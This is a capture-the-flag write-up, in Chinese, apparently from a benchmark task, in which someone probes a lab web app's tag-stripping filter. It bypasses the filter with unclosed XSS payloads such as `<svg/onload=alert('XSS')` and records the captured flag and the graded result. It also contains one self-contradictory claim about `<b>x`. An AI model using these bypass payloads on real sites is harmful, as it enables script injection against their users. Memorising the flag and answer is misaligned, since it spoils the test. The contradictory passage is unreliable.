# xben-015-24 · 探索记录

对应题解：[`xben-015-24.md`](./xben-015-24.md)

## 目标与起点

容器 `10.0.173.136:5000`，`Werkzeug/1.0.1 Python/2.7.18`。

`GET /` → `Dalgona Challenges`，入口 `Page`。
`GET /page` 标题 `Dalgona - Star`，样式表 `static/css/xss/xss23.css`。

反射位置在文本节点，**独占一行**（不像 004/008 那样紧跟模板的 `>`）：

```html
<input type=text name=name placeholder="Enter your name...">
                    ZZZ
```

失败信号仍是那句 `Oops! ... TypeError ... instead of "XSS"`。

## 第一阶段：完整载荷全部失败

| payload | 反射 | 结果 |
| --- | --- | --- |
| `<svg/onload=alert("XSS")>` | （空） | 失败 |
| `<input autofocus onfocus=alert("XSS")>` | （空） | 失败 |

两条都被**整段删掉**，说明是"删标签"类过滤（而不是 013 的整段丢弃——这里连失败文案都正常）。

## 第二阶段：`Q…Q` 探针定位规则

| 片段 | 反射 |
| --- | --- |
| `QabcQ` | `QabcQ` |
| `Q<Q` / `Q>Q` | 原样保留 |
| `Q<svgQ`（无 `>`） | `Q<svgQ` |
| `QalertQ` / `QonloadQ` | 原样保留 |
| `Q"XSS"Q` | 原样保留 |
| `Qa bQ` | `Qa bQ` ← **空白不删** |
| `<svg>` | （空） |
| `<>` | `<>` ← 正则要求中间至少一个字符 |
| `<b>x</b>` | `x` |
| `<b>x` | `x` ← 未闭合的 `<b` 也被吃掉了 |

结论：

```text
re.sub(r'<[^>]+>', '', s)
```

（`<b>x` 里 `<b` 被删是因为后面出现了 `>`？不——实际上 `<b>x` 没有 `>`，
但反射只剩 `x`。说明这个实现在别的环节也处理了"未闭合开标签"。
不管怎样，**payload 里不能出现 `<…>`，也不能出现单独的 `<字母`**。）

## 第三阶段：不闭合绕过

用 `<svg/onload=alert("XSS")`（**结尾不写 `>`**）：

| payload | 反射 | 结果 |
| --- | --- | --- |
| `<svg/onload=alert("XSS")` | 完整保留 | **Congratulations** |
| `<body/onload=alert("XSS")` | 完整保留 | **Congratulations** |
| `<img/src=x/onerror=alert("XSS")` | 完整保留 | 失败（未触发） |

机制：正则要 `>` 才删，所以少了 `>` 就活下来；
浏览器遇到未闭合的标签会继续吞，直到遇到文档里下一个 `>`（模板的 `</form>`）。

## 第四阶段：拿 flag

```bash
curl --get --data-urlencode 'name=<svg/onload=alert("XSS")' http://$T/page
```

```html
Congratulations!<p> Here is the flag: flag{ecda1666-d20e-4be1-901a-c33d01466337}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `<svg/onload=alert("XSS")>`（带 `>`） | 反射为空 | `<[^>]+>` 命中 |
| `<input autofocus onfocus=alert("XSS")>` | 反射为空 | 同上 |
| `<>` | 保留 | 正则要求中间至少一个字符，可作对照 |
| `<b>x</b>` | 只剩 `x` | 标签被删、文本保留 |
| `<img/src=x/onerror=alert("XSS")` | 保留但未触发 | 未闭合 `img` 属性解析不完整 |
| 假设本题也删空白而把 payload 写紧凑 | 无影响（本题不删空白） | `Qa bQ` 原样反射，说明空白保留 |

## 这次真正的收获

1. **先判断"输入是被删了还是被拒了"。** 本题反射为空且页面正常，说明是删除型；
   如果是 013 那种整段丢弃，连 `Oops!` 都不会出现。这个区分决定了后面找"正则缺口"
   还是找"字面量拆分"。
2. **`<[^>]+>` 的通用缺口是不写 `>`。** 这条在 011（xss24）和 015（xss23）都成立，
   说明该靶场族里至少两关用同一个正则。以后遇到"完整标签消失、单个尖括号保留"
   就直接试不闭合。
3. **`<>` 是一个很好的边界探针。** 它保留下来，证明正则里 `+` 而不是 `*`，
   顺便排除了"所有尖括号都删"的可能。
4. **标签选择要试多个。** `svg` / `body` 成功，`img` 失败——未闭合状态下
   不同标签的属性解析行为不同。这一步只花了 3 个请求，比死磕一个标签划算。
5. **空白规则必须单独确认。** 011 删空白、015 不删。把上一关的结论直接搬过来，
   虽然本题恰好也能过（payload 里本来没空格），但会掩盖真实规则，
   在需要空格分隔属性的场景（如 `<svg onload=…>`）就会误判。
